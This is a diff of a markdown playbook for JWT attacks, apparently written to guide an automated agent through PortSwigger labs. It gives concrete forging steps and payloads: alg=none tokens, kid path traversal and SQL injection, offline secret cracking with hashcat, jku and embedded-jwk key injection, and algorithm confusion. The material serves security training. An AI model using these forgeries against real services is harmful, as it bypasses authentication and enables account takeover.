@@ -1,129 +1,107 @@
-# JWT (JSON Web Token) Vulnerabilities
+# JWT Attacks Methodology
+## Expert-Level Playbook (alg confusion, key injection, weak secrets)
 
-> Modern apps stand or fall on JWT. The signing key, the algorithm, and
-> the validation logic are three independent attack surfaces.
-
----
-
-## Phase 1: Discovery
-
-### Where JWTs live
-- `Authorization: Bearer eyJ...` headers
-- Cookies named `access_token`, `id_token`, `auth`, `jwt`, `session`
-- Response bodies after login (`access_token`, `id_token`, `refresh_token`)
-- WebSocket auth handshakes
-- OAuth/OIDC flows: `id_token` in URL fragments / query strings
-
-### Identification
-JWT shape: 3 base64url segments separated by `.`. Decode each:
-```
-header   = base64url-decode(part1)  -> {"alg": "...", "kid": "...", "jku": "..."}
-payload  = base64url-decode(part2)  -> claims
-signature= base64url-decode(part3)  -> bytes
-```
-
-Important header fields to record as facts:
-- `alg`: HS256 / RS256 / ES256 / **none**
-- `kid`: key identifier (often a path/file/UUID)
-- `jku`: URL to JWKS (potential SSRF + key confusion)
-- `x5u`: URL to certificate chain
-- `typ`, `cty`
+> 6 PortSwigger labs. Drive every attack with the `jwt_tool` wrapper; only
+> change the claim the lab needs (usually `sub`/`username`/role), then replay the
+> exact privileged request. Always test the untouched-but-invalid-signature
+> control so you can prove the flaw is the signature check, not something else.
 
 ---
 
-## Phase 2: Attacks
+## Phase 1: Recon
 
-### 2.1 alg=none
-```python
-header  = {"alg": "none", "typ": "JWT"}
-payload = <unmodified or escalated>
-token   = b64url(header) + "." + b64url(payload) + "."   # empty signature
+### 1.1 Locate & decode
+JWTs live in cookies, `Authorization: Bearer`, `localStorage`, or JS.
 ```
-Try with: `none`, `None`, `NONE`, `nOne`. Send. If accepted, that's a
-critical bypass.
-
-### 2.2 HS256/RS256 algorithm confusion
-Many libraries take the same secret store and verify HS256 with whatever
-key is available — including the public RSA key intended for RS256
-verification. Steps:
-1. Recover the server's RSA public key (from `jku` header URL, or from
-   `/.well-known/jwks.json`, or just by looking for it in JS)
-2. Forge a token with `alg=HS256`, sign it using the public key as the
-   HMAC secret
-3. Send. If validated, the lib is vulnerable.
-
-### 2.3 Weak HMAC secret (HS256)
-If `alg=HS256`, brute-force the secret offline:
-```bash
-hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
-john --format=HMAC-SHA256 token.txt
+jwt_tool token=<jwt> target_url=https://TARGET/    # decode header+payload+claims
 ```
-Common defaults to try first: `secret`, `your-256-bit-secret`,
-`changeme`, `password`, the application name.
+Inspect header: `alg`, `kid`, `jku`, `jwk`, `x5u`, `typ`; payload: `sub`, role,
+`iss`, `aud`, `exp`. Find the admin-only endpoint you'll replay against.
 
-### 2.4 kid injection
-The `kid` (key id) header tells the server which key to load. If it's
-unsanitized:
-- **Path traversal**: `kid=../../../../dev/null` — server uses /dev/null
-  as the HMAC key (empty), forge with empty key
-- **SQL injection**: `kid=' UNION SELECT 'mykey'-- ` — server returns
-  attacker-controlled key
-- **Command injection in key lookup**: rare but happens
+---
 
-### 2.5 jku / x5u abuse
-`jku` and `x5u` point to remote JWKS. If the server fetches them:
-- Set `jku=http://<oob>/jwks.json` — confirms SSRF + that the server
-  trusts attacker-supplied URLs
-- If trusted: host a JWKS with your own public key, sign with your
-  matching private key, server validates as if you were the issuer
+## Phase 2: Attack Matrix (per sub-variant)
 
-### 2.6 Embedded jwk
-Some libs honour an embedded `jwk` in the header. If they do:
-1. Generate your own RSA keypair
-2. Forge the token with `alg=RS256`, `jwk=<your_public_key>`,
-   sign with your private key
-3. Server reads `jwk` from the header and verifies with it. Accepted = total bypass.
+| Sub-variant | Root cause | Attack |
+|-------------|------------|--------|
+| Unverified signature | server doesn't verify at all | change payload, keep/garble sig |
+| `alg: none` | server accepts unsigned | set `alg=none`, strip signature |
+| Weak HMAC secret | guessable HS256 key | crack offline, re-sign |
+| JWK header injection | server trusts embedded `jwk` | embed your public key, sign RS256 |
+| JKU header injection | server fetches `jku` URL | host your JWKS, point `jku` at it |
+| KID path traversal | `kid` used in key lookup | `kid` → `/dev/null` / known file → sign with that |
+| KID SQL injection | `kid` into SQL key lookup | inject to return a known key |
+| Algorithm confusion | RS256 verified as HS256 | sign HS256 using the RSA **public** key as the secret |
 
-### 2.7 Claim manipulation
-Even with valid signature, broken validation:
-- `exp` not checked → expired tokens accepted
-- `aud` not checked → token from a sister service accepted
-- `iss` not checked → token from any issuer
-- `sub` swap → identity takeover
-- `role` claim rewritable via mass assignment elsewhere
+### 2.1 Unverified signature / alg=none
+```
+jwt_tool token=<jwt> mode=tamper   # set username/sub=administrator
+# alg=none: header {"alg":"none"} and empty signature segment (trailing '.')
+```
+
+### 2.2 Weak HMAC secret (offline crack)
+```
+jwt_tool token=<jwt> mode=crack wordlist=/usr/share/wordlists/jwt.secrets.list
+# or: run_shell command="hashcat -m 16500 jwt.txt wordlist"
+# then re-sign with the recovered secret and the tampered payload.
+```
+
+### 2.3 JWK injection (self-signed RS256)
+Generate an RSA keypair, embed the public key as a `jwk` in the header, sign with
+the private key. Server trusts the attached key.
+```
+jwt_tool token=<jwt> mode=jwk_inject   # or run_shell with jwt_tool -X i
+```
+
+### 2.4 JKU injection (host JWKS)
+```
+# 1) generate keypair; publish JWKS at an in-scope/exploit-server URL
+# 2) set header {"alg":"RS256","kid":"<your kid>","jku":"https://exploit-.../jwks.json"}
+# 3) sign with your private key
+```
+Host `jwks.json` with `exploit_server.store(head, body, path="/jwks.json")`.
+
+### 2.5 KID path traversal / SQLi
+```
+# kid → a file with known contents so you can predict the HMAC key:
+{"alg":"HS256","kid":"../../../../../../dev/null"}   # key = empty string
+{"alg":"HS256","kid":"/dev/null"}
+# Sign HS256 with the empty/known key. For KID SQLi: kid injects a UNION that
+# returns a chosen key value.
+```
+
+### 2.6 Algorithm confusion (RS256 → HS256)
+1. Obtain the server's RSA **public** key (`/jwks.json`, `/.well-known/jwks.json`,
+   or derive from two tokens with `jwt_tool`).
+2. Sign a tampered token with **HS256** using that public key (PEM) as the secret.
+3. Server verifies HS256 with the public key it thinks is for RS256 → accepts.
+```
+jwt_tool token=<jwt> mode=alg_confusion pubkey=jwks_public.pem
+```
 
 ---
 
 ## Phase 3: Tooling
-```bash
-# Decode without verifying
-jwt_tool <token>
-# Or quickly:
-echo "<part>" | base64 -d   # for each segment
 
-# Common test runner
-jwt_tool <token> -T   # tamper mode
-jwt_tool <token> -X a # alg=none
-jwt_tool <token> -X k # kid injection
+```
+jwt_tool          # decode, tamper, crack, jwk/jku inject, alg-confusion, kid tricks
+run_shell         # hashcat/john for secret cracking; openssl for keygen
+http_request      # replay the privileged request with the forged token
+exploit_server    # host jwks.json for jku injection
 ```
 
-If `jwt_tool` isn't installed in the container, do it manually with curl:
-```bash
-HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
-PAYLOAD=$(echo -n '<modified payload json>' | base64 -w0 | tr '+/' '-_' | tr -d '=')
-echo "${HEADER}.${PAYLOAD}."
-```
+## Common Failure Modes & Solutions
 
----
+| Problem | Solution |
+|---------|----------|
+| Token rejected after tamper | Recompute the signature; check `alg` casing (`none`/`None`) |
+| alg=none blocked | Try algorithm confusion or weak-secret crack instead |
+| jku not fetched | Ensure `jku` host is reachable/in-scope; match `kid` in header and JWKS |
+| Secret not in wordlist | Use a JWT-specific wordlist; try known lab secrets first |
+| Confusion fails | Public key must be the exact PEM (trailing newline matters) |
 
-## Phase 4: Verification + PoC
-
-A JWT PoC is reportable when:
-- The forged token is accepted in a privileged action (data read/write/admin)
-- The action wouldn't have been possible with the original token
-
-The validator should:
-- Replay the forged token to confirm acceptance
-- Counter-probe with a token where the SIGNATURE is corrupted but the
-  rest is identical — if THAT also passes, signature isn't being verified
-  at all (different bug, more severe)
+## Validation / Success Criteria
+- [ ] Privileged endpoint accepts the forged token.
+- [ ] A control token (invalid signature / unchanged claims) is rejected.
+- [ ] Only the required claim was changed.
+- [ ] Lab solved banner observed.
